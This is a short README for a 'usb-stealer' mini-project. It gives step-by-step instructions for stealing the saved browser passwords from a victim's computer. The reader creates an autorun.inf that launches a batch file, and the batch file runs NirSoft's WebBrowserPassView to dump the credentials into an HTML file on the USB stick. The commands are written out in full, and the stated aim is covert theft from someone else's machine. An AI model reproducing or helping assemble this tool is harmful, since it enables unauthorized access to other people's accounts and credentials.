# usb-stealer

Hi ✋ 

My mini-project  is USB stealer 
The idea is very simple by inserting USB to the victim's computer 💻  and remove it and the output is getting all saved passwords.


Tools used WebBrowserPassView from nirosft


 Steps:
 
 All in USB   
 
  - Creating an autorun file to launch the app after inserting the USB
 
  - Creating launch.bat file 
  
  - Copy  WebBrowserPassView.exe


Detail:

*   Open notepad and type:       [Autorun]open=launch.bat

And save it as an autorun.inf


Open notepad and type: 

Start  WebBrowserPassView.exe /shtml output.html

And save is as launch.bat

Now Our USB is ready 

How it's work:

WebBrowserPassView go when passwords are saved and copy it 






------------------------------------------
WebBrowserPassView is a password recovery tool that reveals the passwords stored by the following Web browsers: Internet Explorer (Version 4.0 - 11.0), Mozilla Firefox (All Versions), Google Chrome, Safari, and Opera. This tool can be used to recover your lost/forgotten password of any Web site, including popular Web sites, like Facebook, Yahoo, Google, and Gmail, as long as the password is stored by your Web Browser.  
